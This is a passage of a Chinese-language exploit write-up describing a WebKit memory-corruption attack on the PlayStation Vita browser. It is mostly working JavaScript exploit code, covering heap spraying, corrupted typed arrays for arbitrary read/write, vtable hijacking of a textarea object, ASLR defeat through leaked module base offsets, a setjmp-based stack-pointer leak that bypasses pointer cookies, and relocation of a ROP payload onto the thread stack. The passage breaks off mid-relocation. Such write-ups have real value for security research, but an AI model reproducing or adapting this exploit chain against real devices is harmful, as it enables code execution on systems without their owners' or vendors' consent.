<span class="k">for</span> <span class="p">(</span><span class="n">var</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x2000</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
    <span class="n">foo</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
<span class="n">foo</span><span class="p">.</span><span class="n">sort</span><span class="p">();</span>
</pre></div>


<p><code>u2d/d2u</code> 是个在<code>int</code> 和 <code>double</code>之间转换的小助手：</p>
<div class="codehilite"><pre><span></span><span class="kd">var</span> <span class="nx">_dview</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
<span class="c1">// u2d/d2u taken from PSA-2013-0903</span>
<span class="c1">// wraps two uint32s into double precision</span>
<span class="kd">function</span> <span class="nx">u2d</span><span class="p">(</span><span class="nx">low</span><span class="p">,</span><span class="nx">hi</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">_dview</span><span class="p">)</span> <span class="nx">_dview</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
    <span class="nx">_dview</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nx">hi</span><span class="p">);</span>
    <span class="nx">_dview</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="nx">low</span><span class="p">);</span>
    <span class="k">return</span> <span class="nx">_dview</span><span class="p">.</span><span class="nx">getFloat64</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>    
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">d2u</span><span class="p">(</span><span class="nx">d</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">_dview</span><span class="p">)</span> <span class="nx">_dview</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
    <span class="nx">_dview</span><span class="p">.</span><span class="nx">setFloat64</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nx">d</span><span class="p">);</span>
    <span class="k">return</span> <span class="p">{</span> <span class="nx">low</span><span class="o">:</span> <span class="nx">_dview</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="mi">4</span><span class="p">),</span> 
             <span class="nx">hi</span><span class="o">:</span>  <span class="nx">_dview</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="p">};</span>    
<span class="p">}</span>
</pre></div>


<p>那么，如果我们现在查看<code>arrays</code> 我们将会发现 <code>JSArray</code> 对象扩展超出了它们的真正边界，而且它们的长度设置成了 <code>0x8000000</code>。</p>
<p>因垂死听，这成功破坏了 Vita 上的 <code>JSArray</code> 对象，但是 Linux 上的崩溃触发了一个保护页。但这并不重要，因为我们攻击 Vita 而不是 Linux。</p>
<p>现在当我们向一个损坏的<code>bar</code>对象写入的时候，我们可以实现一个越界任意读写，这很棒！但让我们升级到一个真正的任意读写吧。</p>
<p>聪明的读者可能会注意到，由于 Vita 是一个 32 位的终端， 我们将长度设置为 <code>0x8000000</code> ，每个<code>JSValue</code> 是 8 字节的，我们实际上已经有了任意读写的能力了。然而，我们仍然在从原始的<code>bar</code> 向量基写到偏移处，至今仍未泄漏任何堆的地址。此外，我们只能写<code>double</code>类型的值，这超级不方便。</p>
<h3>Arbitrary RW</h3>
<p>为了获得任意读写能力，我使用了与 2.00-3.20 WebKit 漏洞利用相同的技巧，<a href="http://acez.re/ps-vita-level-1-webkitties-3/">详情点此</a>。</p>
<p>Spray buffers:</p>
<div class="codehilite"><pre><span></span>buffers = new Array(spray_size);
buffer_len = 0x1344;
for (var i = 0; i &lt; buffers.length; ++i)
    buffers[i] = new Uint32Array(buffer_len / 4);
</pre></div>


<p>在内存中查找 <code>Uint32Array</code> buffer，在损坏的缓冲区之前（此处称为<code>arr</code>）的某个任意偏移开始进行搜索。</p>
<div class="codehilite"><pre><span></span><span class="kd">var</span> <span class="nx">start</span> <span class="o">=</span> <span class="mh">0x20000000</span><span class="o">-</span><span class="mh">0x11000</span><span class="p">;</span>
<span class="k">for</span><span class="p">(;;</span> <span class="nx">start</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="nx">start</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">_dview</span><span class="p">.</span><span class="nx">setFloat64</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">start</span><span class="p">]);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">_dview</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="nx">buffer_len</span> <span class="o">/</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Found Uint32Array</span>
            <span class="nx">_dview</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xEFFFFFE0</span><span class="p">);</span>
            <span class="nx">arr</span><span class="p">[</span><span class="nx">start</span><span class="p">]</span> <span class="o">=</span> <span class="nx">_dview</span><span class="p">.</span><span class="nx">getFloat64</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// change buffer size</span>

            <span class="nx">_dview</span><span class="p">.</span><span class="nx">setFloat64</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">start</span><span class="o">-</span><span class="mi">2</span><span class="p">]);</span>
            <span class="nx">heap_addr</span> <span class="o">=</span> <span class="nx">_dview</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="mi">4</span><span class="p">);</span> <span class="c1">// leak some heap address</span>
            <span class="nx">_dview</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
            <span class="nx">_dview</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x80000000</span><span class="p">);</span>
            <span class="nx">arr</span><span class="p">[</span><span class="nx">start</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">_dview</span><span class="p">.</span><span class="nx">getFloat64</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// change buffer offset</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>


<p>查找损坏的 <code>Uint32Array</code>：</p>
<div class="codehilite"><pre><span></span><span class="nx">corrupted</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">buffers</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">buffers</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">byteLength</span> <span class="o">!=</span> <span class="nx">buffer_len</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">corrupted</span> <span class="o">=</span> <span class="nx">buffers</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="kd">var</span> <span class="nx">u32</span> <span class="o">=</span> <span class="nx">corrupted</span><span class="p">;</span>
</pre></div>


<p>既然我们有了真正的任意读写，而且已经泄漏了一些堆地址，接下来便是：</p>
<h3>Code execution</h3>
<p>使用 <code>textarea</code> 对象的旧技巧这里再次使用（为什么发明新轮子？）首先，修改原来的<code>Uint32Array</code> 堆喷射交织至<code>textarea</code>对象。</p>
<div class="codehilite"><pre><span></span><span class="nx">spray_size</span> <span class="o">=</span> <span class="mh">0x4000</span><span class="p">;</span>

<span class="nx">textareas</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">spray_size</span><span class="p">);</span>
<span class="nx">buffers</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">spray_size</span><span class="p">);</span>
<span class="nx">buffer_len</span> <span class="o">=</span> <span class="mh">0x1344</span><span class="p">;</span>
<span class="nx">textarea_cookie</span> <span class="o">=</span> <span class="mh">0x66656463</span><span class="p">;</span>
<span class="nx">textarea_cookie2</span> <span class="o">=</span> <span class="mh">0x55555555</span><span class="p">;</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">buffers</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">buffers</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">buffer_len</span> <span class="o">/</span> <span class="mi">4</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&quot;textarea&quot;</span><span class="p">);</span>
    <span class="nx">e</span><span class="p">.</span><span class="nx">rows</span> <span class="o">=</span> <span class="nx">textarea_cookie</span><span class="p">;</span>
    <span class="nx">textareas</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">e</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>使用损坏的<code>Uint32Array</code> 对象，在内存中找到<code>textarea</code>。</p>
<div class="codehilite"><pre><span></span><span class="kd">var</span> <span class="nx">some_space</span> <span class="o">=</span> <span class="nx">heap_addr</span><span class="p">;</span>
<span class="nx">search_start</span> <span class="o">=</span> <span class="nx">heap_addr</span><span class="p">;</span>

<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">addr</span> <span class="o">=</span> <span class="nx">search_start</span><span class="o">/</span><span class="mi">4</span><span class="p">;</span> <span class="nx">addr</span> <span class="o">&lt;</span> <span class="nx">search_start</span><span class="o">/</span><span class="mi">4</span> <span class="o">+</span> <span class="mh">0x4000</span><span class="p">;</span> <span class="o">++</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">u32</span><span class="p">[</span><span class="nx">addr</span><span class="p">]</span> <span class="o">==</span> <span class="nx">textarea_cookie</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">u32</span><span class="p">[</span><span class="nx">addr</span><span class="p">]</span> <span class="o">=</span> <span class="nx">textarea_cookie2</span><span class="p">;</span>
        <span class="nx">textarea_addr</span> <span class="o">=</span> <span class="nx">addr</span> <span class="o">*</span> <span class="mi">4</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="cm">/*</span>
<span class="cm">    Change the rows of the Element object then scan the array of</span>
<span class="cm">    sprayed objects to find an object whose rows have been changed</span>
<span class="cm">*/</span>
<span class="kd">var</span> <span class="nx">found_corrupted</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">corrupted_textarea</span><span class="p">;</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">textareas</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">textareas</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">rows</span> <span class="o">==</span> <span class="nx">textarea_cookie2</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">corrupted_textarea</span> <span class="o">=</span> <span class="nx">textareas</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>


<p>现在我们有两个“视图”到同一个<code>textarea</code>：我们可以使用我们的<code>u32</code>对象在内存中直接修改它，我们还可以从 JavaScript 中调用它的函数。所以关键思路是通过我们的“内存访问”覆盖 vptr ，然后通过 JavaScript 调用修改的函数表。</p>
<h3>Mitigation 1: ASLR</h3>
<p>记住，Vita 有 ASLR ， 这就是为什么我们为何不得不复杂化这么多漏洞利用方法。但是利用任意读写的方法，我们可以泄漏<code>textarea</code> vptr 并且完全击败 ASLR；</p>
<div class="codehilite"><pre><span></span><span class="kd">function</span> <span class="nx">read_mov_r12</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">first</span> <span class="o">=</span> <span class="nx">u32</span><span class="p">[</span><span class="nx">addr</span><span class="o">/</span><span class="mi">4</span><span class="p">];</span>
    <span class="nx">second</span> <span class="o">=</span> <span class="nx">u32</span><span class="p">[</span><span class="nx">addr</span><span class="o">/</span><span class="mi">4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
    <span class="k">return</span> <span class="p">((((</span><span class="nx">first</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="nx">first</span> <span class="o">&amp;</span> <span class="mh">0xF0000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span><span class="p">)</span> <span class="o">|</span> <span class="p">((((</span><span class="nx">second</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="nx">second</span> <span class="o">&amp;</span> <span class="mh">0xF0000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">))</span> <span class="o">&gt;&gt;&gt;</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">var</span> <span class="nx">vtidx</span> <span class="o">=</span> <span class="nx">textarea_addr</span> <span class="o">-</span> <span class="mh">0x70</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">textareavptr</span> <span class="o">=</span> <span class="nx">u32</span><span class="p">[</span><span class="nx">vtidx</span> <span class="o">/</span> <span class="mi">4</span><span class="p">];</span>

<span class="nx">SceWebKit_base</span> <span class="o">=</span> <span class="nx">textareavptr</span> <span class="o">-</span> <span class="mh">0xabb65c</span><span class="p">;</span>
<span class="nx">SceLibc_base</span> <span class="o">=</span> <span class="nx">read_mov_r12</span><span class="p">(</span><span class="nx">SceWebKit_base</span> <span class="o">+</span> <span class="mh">0x85F504</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xfa49</span><span class="p">;</span>
<span class="nx">SceLibKernel_base</span> <span class="o">=</span> <span class="nx">read_mov_r12</span><span class="p">(</span><span class="nx">SceWebKit_base</span> <span class="o">+</span> <span class="mh">0x85F464</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x9031</span><span class="p">;</span>
<span class="nx">ScePsp2Compat_base</span> <span class="o">=</span> <span class="nx">read_mov_r12</span><span class="p">(</span><span class="nx">SceWebKit_base</span> <span class="o">+</span> <span class="mh">0x85D2E4</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x22d65</span><span class="p">;</span>
<span class="nx">SceWebFiltering_base</span> <span class="o">=</span> <span class="nx">read_mov_r12</span><span class="p">(</span><span class="nx">ScePsp2Compat_base</span> <span class="o">+</span> <span class="mh">0x2c688c</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x9e5</span><span class="p">;</span>
<span class="nx">SceLibHttp_base</span> <span class="o">=</span> <span class="nx">read_mov_r12</span><span class="p">(</span><span class="nx">SceWebFiltering_base</span> <span class="o">+</span> <span class="mh">0x3bc4</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xdc2d</span><span class="p">;</span>
<span class="nx">SceNet_base</span> <span class="o">=</span> <span class="nx">read_mov_r12</span><span class="p">(</span><span class="nx">SceWebKit_base</span> <span class="o">+</span> <span class="mh">0x85F414</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x23ED</span><span class="p">;</span>
<span class="nx">SceNetCtl_base</span> <span class="o">=</span> <span class="nx">read_mov_r12</span><span class="p">(</span><span class="nx">SceLibHttp_base</span> <span class="o">+</span> <span class="mh">0x18BF4</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xD59</span><span class="p">;</span>
<span class="nx">SceAppMgr_base</span> <span class="o">=</span> <span class="nx">read_mov_r12</span><span class="p">(</span><span class="nx">SceNetCtl_base</span> <span class="o">+</span> <span class="mh">0x9AB8</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x49CD</span><span class="p">;</span>
</pre></div>


<p>我们谈谈代码执行吧。在 Vita 上没有 JIT ，也不可能分配 RWX 内存（只允许来自 PlayStation 的 Mobile App）。因此我们必须在 ROP 中写整个 payload 。</p>
<p>之前的 exploit 使用了一个叫做 <code>JSoS</code> 的技术，<a href="http://acez.re/ps-vita-level-1-webkitties-3/">点此查看详情</a>。然而，浏览器在破坏 <code>JSArray</code> 之后变得实在是不稳定，所以我们向尽可能少的运行 JavaScript 代码。</p>
<p>因此，新版本的 <a href="https://bitbucket.org/DaveeFTW/roptool">roptool</a> 由 <a href="https://twitter.com/DaveeFTW">Davee</a> 编写，支持 ASLR。这里的基本思想是 roptool 输出中有一些字（一个 word 4 字节）现在具有分配给它们的重定位信息。在重定位 payload 之后，这只是向这些字添加不同的base（<code>SceWebKit_base</code>/<code>SceLibc_base</code> /等），我们可以正常启动生成的 ROP 链。</p>
<h3>Mitigation 2: Stack-pivot protection</h3>
<p>由于固件版本未知，现在有了额外的漏洞缓解实施方案：有时内核将检测你的线程栈指针实际是在其堆栈内的。如果不是的话，整个程序将被杀死。</p>
<p>为了绕过这个情况，我们需要将我们的 ROP 链植入线程堆栈。为了做到这点，我们需要线程栈虚地址。因为ASLR的存在，我们并不知道此地址。</p>
<p>然而我们有内存任意读写。有大量方法泄漏栈指针。我使用 <a href="http://man7.org/linux/man-pages/man3/longjmp.3.html">setjmp</a>函数。</p>
<p>这便是我们如何调用它的：</p>
<div class="codehilite"><pre><span></span><span class="c1">// copy vtable</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x40</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span>
    <span class="nx">u32</span><span class="p">[</span><span class="nx">some_space</span> <span class="o">/</span> <span class="mi">4</span> <span class="o">+</span> <span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">u32</span><span class="p">[</span><span class="nx">textareavptr</span> <span class="o">/</span> <span class="mi">4</span> <span class="o">+</span> <span class="nx">i</span><span class="p">];</span>

<span class="nx">u32</span><span class="p">[</span><span class="nx">vtidx</span> <span class="o">/</span> <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nx">some_space</span><span class="p">;</span>

<span class="c1">// backup our obj</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x30</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span>
    <span class="nx">backup</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">u32</span><span class="p">[</span><span class="nx">vtidx</span><span class="o">/</span><span class="mi">4</span> <span class="o">+</span> <span class="nx">i</span><span class="p">];</span>

<span class="c1">// call setjmp and leak stack base</span>
<span class="nx">u32</span><span class="p">[</span><span class="nx">some_space</span> <span class="o">/</span> <span class="mi">4</span> <span class="o">+</span> <span class="mh">0x4e</span><span class="p">]</span> <span class="o">=</span> <span class="nx">SceLibc_base</span> <span class="o">+</span> <span class="mh">0x14070</span><span class="o">|</span><span class="mi">1</span><span class="p">;</span> <span class="c1">// setjmp</span>
<span class="nx">corrupted_textarea</span><span class="p">.</span><span class="nx">scrollLeft</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// call setjmp</span>
</pre></div>


<p>现在我们的 <code>corrupted_textarea</code> 在内存中被  <code>jmp_buf</code> 覆盖，此处包含堆栈指针。然后，我们回复如下原始数据。这是为了在我们试图对损坏的 <code>textarea</code> 对象做一些事情的时候，JavaScript 不会使浏览器崩溃。</p>
<div class="codehilite"><pre><span></span><span class="c1">// restore our obj</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x30</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span>
    <span class="nx">u32</span><span class="p">[</span><span class="nx">vtidx</span><span class="o">/</span><span class="mi">4</span> <span class="o">+</span> <span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">backup</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
</pre></div>


<p>不幸的是，如果我们看到在 <code>SceLibc</code> 中 <code>setjmp</code> 的实现，我们得到另一个漏洞利用缓解方案。</p>
<div class="codehilite"><pre><span></span><span class="nl">ROM:</span><span class="err">81114070</span> <span class="nf">setjmp</span>
<span class="nl">ROM:</span><span class="err">81114070</span>                 <span class="nf">PUSH</span>            <span class="err">{</span><span class="no">R0</span><span class="p">,</span><span class="no">LR</span><span class="err">}</span>
<span class="nl">ROM:</span><span class="err">81114072</span>                 <span class="nf">BL</span>              <span class="no">sub_81103DF2</span> <span class="err">//</span> <span class="no">Returns</span> <span class="no">high-quality</span> <span class="no">random</span> <span class="no">cookie</span>
<span class="nl">ROM:</span><span class="err">81114076</span>                 <span class="nf">POP</span>             <span class="err">{</span><span class="no">R1</span><span class="p">,</span><span class="no">R2</span><span class="err">}</span>
<span class="nl">ROM:</span><span class="err">81114078</span>                 <span class="nf">MOV</span>             <span class="no">LR</span><span class="p">,</span> <span class="no">R2</span>
<span class="nl">ROM:</span><span class="err">8111407</span><span class="nf">A</span>                 <span class="no">MOV</span>             <span class="no">R3</span><span class="p">,</span> <span class="no">SP</span>
<span class="nl">ROM:</span><span class="err">8111407</span><span class="nf">C</span>                 <span class="no">STMIA.W</span>         <span class="no">R1</span><span class="p">!,</span> <span class="err">{</span><span class="no">R4-R11</span><span class="err">}</span>
<span class="nl">ROM:</span><span class="err">81114080</span>                 <span class="nf">EORS</span>            <span class="no">R2</span><span class="p">,</span> <span class="no">R0</span> <span class="err">//</span> <span class="no">LR</span> <span class="no">is</span> <span class="no">XOR</span><span class="err">&#39;</span><span class="no">ed</span> <span class="no">with</span> <span class="no">a</span> <span class="no">cookie</span>
<span class="nl">ROM:</span><span class="err">81114082</span>                 <span class="nf">EORS</span>            <span class="no">R0</span><span class="p">,</span> <span class="no">R3</span> <span class="err">//</span> <span class="no">SP</span> <span class="no">is</span> <span class="no">XOR</span><span class="err">&#39;</span><span class="no">ed</span> <span class="no">with</span> <span class="no">the</span> <span class="no">same</span> <span class="no">cookie</span>
<span class="nl">ROM:</span><span class="err">81114084</span>                 <span class="nf">STMIA</span>           <span class="no">R1</span><span class="p">!,</span> <span class="err">{</span><span class="no">R0</span><span class="p">,</span><span class="no">R2</span><span class="err">}</span>
<span class="nl">ROM:</span><span class="err">81114086</span>                 <span class="nf">VSTMIA</span>          <span class="no">R1</span><span class="p">!,</span> <span class="err">{</span><span class="no">D8-D15</span><span class="err">}</span>
<span class="nl">ROM:</span><span class="err">8111408</span><span class="nf">A</span>                 <span class="no">VMRS</span>            <span class="no">R2</span><span class="p">,</span> <span class="no">FPSCR</span>
<span class="nl">ROM:</span><span class="err">8111408</span><span class="nf">E</span>                 <span class="no">STMIA</span>           <span class="no">R1</span><span class="p">!,</span> <span class="err">{</span><span class="no">R2</span><span class="err">}</span>
<span class="nl">ROM:</span><span class="err">81114090</span>                 <span class="nf">MOV.W</span>           <span class="no">R0</span><span class="p">,</span> <span class="c">#0</span>
<span class="no">ROM</span><span class="p">:</span><span class="mi">81114094</span>                 <span class="no">BX</span>              <span class="no">LR</span>
</pre></div>


<p>基本上:</p>
<div class="codehilite"><pre><span></span><span class="nx">stored_LR</span> <span class="o">=</span> <span class="nx">LR</span> <span class="o">^</span> <span class="nx">cookie</span>
<span class="nx">stored_SP</span> <span class="o">=</span> <span class="nx">SP</span> <span class="o">^</span> <span class="nx">cookie</span>
</pre></div>


<p>你能看明白这是怎么回事吗？我们已经知道 <code>SceWebKit_base</code>，所以我们知道<code>LR</code>的真正价值。使用离散代数魔法：</p>
<div class="codehilite"><pre><span></span><span class="nx">cookie</span> <span class="o">=</span> <span class="nx">stored_LR</span> <span class="o">^</span> <span class="nx">LR</span>
<span class="nx">SP</span> <span class="o">=</span> <span class="nx">stored_SP</span> <span class="o">^</span> <span class="nx">cookie</span>
<span class="nx">SP</span> <span class="o">=</span> <span class="nx">stored_SP</span> <span class="o">^</span> <span class="p">(</span><span class="nx">stored_LR</span> <span class="o">^</span> <span class="nx">LR</span><span class="p">)</span>
</pre></div>


<p>或者在 JavaScript 中：</p>
<div class="codehilite"><pre><span></span><span class="nx">sp</span> <span class="o">=</span> <span class="p">(</span><span class="nx">u32</span><span class="p">[</span><span class="nx">vtidx</span><span class="o">/</span><span class="mi">4</span> <span class="o">+</span> <span class="mi">8</span><span class="p">]</span> <span class="o">^</span> <span class="p">((</span><span class="nx">u32</span><span class="p">[</span><span class="nx">vtidx</span><span class="o">/</span><span class="mi">4</span> <span class="o">+</span> <span class="mi">9</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="nx">SceWebKit_base</span> <span class="o">+</span> <span class="mh">0x317929</span><span class="p">))</span> <span class="o">&gt;&gt;&gt;</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&gt;&gt;&gt;</span> <span class="mi">0</span><span class="p">;</span>
<span class="nx">sp</span> <span class="o">-=</span> <span class="mh">0xef818</span><span class="p">;</span> <span class="c1">// adjust to get SP base</span>
</pre></div>


<p>现在我们可以将我们的 ROP payload 写入线程栈并转向它，而不会停止应用程序！</p>
<h3>Finally, Code Execution</h3>
<p>首先，我们重定位 ROP payload。记住我们如何获得 payload 和 relocs。如果你看到 payload.js ，这将是你所看到的：</p>
<div class="codehilite"><pre><span></span><span class="n">payload</span> <span class="o">=</span> <span class="p">[</span><span class="mi">2119192402</span><span class="p">,</span><span class="mi">65537</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1912</span>    <span class="c1">// and it goes on...</span>
<span class="n">relocs</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>  <span class="c1">// ...</span>
</pre></div>


<p><code>relocs</code> 数组中的每个数字表示了 <code>payload</code> 成员应该如何重定位的。例如，0 表示不进行重定位，1 表示添加 <code>rop_data_base</code>，2 表示 添加 <code>SceWebKit_base</code>，3 表示添加<code>SceLibKernel_base</code> 等...</p>
<p>使用 roptool 生成的 ROP 链有两个部分：代码和数据。代码只是 ROP 堆栈，数据是字符串或缓冲区。<code>rop_data_base</code> 是数据的 vaddr， <code>rop_code_base</code> 是代码的 vaddr）</p>
<p>下一个循环将 payload 直接重定位到线程堆栈中：</p>
<div class="codehilite"><pre><span></span><span class="c1">// relocate the payload</span>
<span class="nx">rop_data_base</span> <span class="o">=</span> <span class="nx">sp</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">;</span>
<span class="nx">rop_code_base</span> <span class="o">=</span> <span class="nx">sp</span> <span class="o">+</span> <span class="mh">0x10000</span><span class="p">;</span>

<span class="nx">addr</span> <span class="o">=</span> <span class="nx">sp</span> <span class="o">/</span> <span class="mi">4</span><span class="p">;</span>
<span class="c1">// Since relocs are applied to the whole rop binary, not just code/data sections, we replicate</span>
<span class="c1">// this behavior here. However, we split it into data section (placed at the top of the stack)</span>
<span class="c1">// and code section (placed at stack + some big offset)</span>
